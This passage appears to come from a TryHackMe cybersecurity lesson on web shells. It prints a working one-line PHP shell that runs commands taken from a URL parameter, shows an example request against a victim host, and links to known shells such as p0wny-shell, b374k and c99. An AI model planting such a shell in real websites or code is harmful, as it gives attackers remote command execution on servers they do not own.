A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.

Web shells can be written in several languages supported by web servers, like PHP, ASP, JSP, and even simple CGI scripts. 

### Example PHP Web Shell

### 

Let’s look at an example PHP web shell to understand how this process works:

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

### The above shell can be saved into a file with the PHP extension, like `shell.php`, and then uploaded into the web server by the attacker by exploiting vulnerabilities such as [Unrestricted File Upload](https://tryhackme.com/r/room/uploadvulns), [File Inclusion](https://tryhackme.com/r/room/fileinc), [Command Injection](https://tryhackme.com/r/room/oscommandinjection), among others, or by gaining unauthorized access to it. 

### After the web shell is deployed in the server, it can be accessed through the URL where the web shell is hosted, in this example http://victim.com/uploads/shell.php. As we observed from the code in `shell.php`, we need to provide a GET method and the value of the variable `cmd`, which should contain the command the attacker wants to execute. For example, if we want to execute the command **whoami** the request to the URL should be:

### http://victim.com/uploads/shell.php?cmd=whoami

### The above will execute the command **whoami** and display the result in the web browser.

### Existing Web Shells Available Online

The power of supported languages by the web servers can result in web shells with lots of functionality and avoid detection at the same time. Let's explore some of the most popular web shells that can be found online 

- [p0wny-shell(opens in new tab)](https://github.com/flozz/p0wny-shell) - A minimalistic single-file PHP web shell that allows remote command execution.
    
    ![The image is a screenshot of the web shell p0wny-shell showing commands being executed in a GUI similar to a real terminal](https://cdn-images.tryhackme.com/user-uploads/66c513e4445cb5649e636a36/room-content/66c513e4445cb5649e636a36-1727563529557.png)
    
- [b374k shell(opens in new tab)](https://github.com/b374k/b374k) - A more feature-rich PHP web shell with file management and command execution, among other functionalities.  
    
    ![The image is a screenshot of b374k shell displaying the file manager feature that allows to manipulate files](https://cdn-images.tryhackme.com/user-uploads/66c513e4445cb5649e636a36/room-content/66c513e4445cb5649e636a36-1727563529904.png)
    
- [c99 shell(opens in new tab)](https://www.r57shell.net/single.php?id=13) - A well-known and robust PHP web shell with extensive functionality.  
    
    ![The image is a screenshot of  c99 shell displaying the command execution feature and the file manipulation one](https://cdn-images.tryhackme.com/user-uploads/66c513e4445cb5649e636a36/room-content/66c513e4445cb5649e636a36-1727563530257.png)